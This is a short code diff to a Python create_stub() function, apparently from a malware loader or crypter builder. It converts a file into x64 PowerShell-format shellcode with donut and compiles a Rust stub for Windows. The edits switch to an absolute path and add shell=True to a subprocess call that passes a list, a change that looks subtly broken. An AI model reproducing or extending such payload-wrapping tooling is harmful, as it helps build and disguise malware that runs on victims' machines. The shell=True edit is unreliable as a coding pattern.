@@ -293,7 +293,7 @@ def create_stub():
 
                 try:
                     shellcode = donut.create(
-                        file=temp_file_path,
+                        file=os.path.abspath(temp_file_path),
                         arch=2,  # x64 architecture
                         format=8  # PowerShell format
                     )
@@ -344,7 +344,7 @@ def create_stub():
                             'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
                         ]
 
-                        result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True)
+                        result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)
 
                         if result.returncode == 0:
                             cpp_exe_created = exe_filename
